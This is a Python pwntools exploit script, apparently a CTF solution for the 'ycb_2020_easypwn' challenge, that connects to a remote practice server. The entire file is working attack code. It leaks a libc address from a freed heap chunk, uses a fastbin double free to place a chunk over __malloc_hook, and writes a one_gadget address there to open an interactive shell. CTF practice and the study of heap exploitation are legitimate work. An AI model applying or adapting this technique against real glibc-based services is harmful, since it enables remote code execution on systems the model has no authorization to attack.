# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './ycb_2020_easypwn'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.23-buu.so')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26183'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add( size , name = 'a' , text = 'b'):
    cmd(1)
    sla('s name:' , size)
    sa('name:' , name)
    sla('message:' , text)

def show( ):
    cmd(2)

def delete(idx ):
    cmd(3)
    sla('index:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    # list = $rebase(0x00000000002020C0)
    add(0x68)
    add(0x68)
    add(0x88)
    add(0x68)

    delete(2)
    add(0x38 , '\x10')
    show()

    __malloc_hook = l64() 
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    realloc = libc.sym['realloc']
    ogg = one_gadget(libc.path)[3] + libc.address
    lg('realloc' , realloc)

    delete(0)
    delete(1)
    delete(0)

    add(0x68 , p64(__malloc_hook - 0x23))
    add(0x68)
    add(0x68)
    add(0x68 , 'a'*(0x13-0x8) + flat(ogg , realloc+4 ))

    # dbg('malloc')
    cmd(1)
    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   ycb_2020_easypwn.py
@Time    :   2022/02/07 21:34:27
@Author  :   Niyah 
'''